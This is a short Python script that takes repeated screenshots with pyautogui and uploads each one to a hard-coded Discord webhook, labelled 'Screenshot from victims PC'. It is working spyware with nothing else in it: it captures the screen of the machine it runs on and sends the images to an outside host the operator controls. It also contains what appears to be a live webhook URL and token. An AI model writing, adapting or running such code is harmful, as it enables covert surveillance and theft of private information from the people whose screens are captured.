import pyautogui
import time
import requests

def take_screenshot(filename='screenshot.png'):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def send_to_discord_webhook(webhook_url, file_path):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        data = {'content': 'Screenshot from victims PC'}
        response = requests.post(webhook_url, files=files, data=data)

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'

    for i in range(5):
        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
        send_to_discord_webhook(webhook_url, screenshot_path)
        time.sleep(0.5)
